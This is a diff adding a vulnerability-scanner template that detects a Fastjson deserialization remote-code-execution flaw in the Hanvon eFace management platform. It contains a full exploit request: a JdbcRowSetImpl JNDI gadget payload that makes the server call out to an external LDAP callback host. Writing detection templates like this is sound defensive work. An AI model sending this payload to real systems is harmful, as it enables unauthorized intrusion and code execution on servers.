@@ -1,0 +1,50 @@
+id: hanvon-fastjson-rce
+
+info:
+  name: Hanvon eFace Fastjson RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Hanvon eFace comprehensive management platform is vulnerable to a deserialization RCE vulnerability in the `addVisitDeviceAppointmentInfoTest.do` endpoint. Attackers can craft malicious JSON payloads exploiting the Fastjson library to execute arbitrary commands on the server.
+  tags: rce, fastjson, deserialization
+
+http:
+  - raw:
+      - |
+        POST /manage/visitorDeviceInteraction/addVisitDeviceAppointmentInfoTest.do?recoToken=SGUsqvF7cVS HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {
+          "isNeedMeetingPermission": "true",
+          "COMMAND": "AddAppointment",
+          "PARAM": {},
+          "a": {
+              "@type": "java.lang.Class",
+              "val": "com.sun.rowset.JdbcRowSetImpl"
+          },
+          "b": {
+              "@type": "com.sun.rowset.JdbcRowSetImpl",
+              "dataSourceName": "ldap://{{interactsh-url}}",
+              "autoCommit": true
+          }
+        }
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - "AddAppointment"
+
+    extractors:
+      - type: regex
+        name: ldap-callback
+        part: interactsh_request
+        regex:
+          - "ldap://[a-zA-Z0-9./-]+"
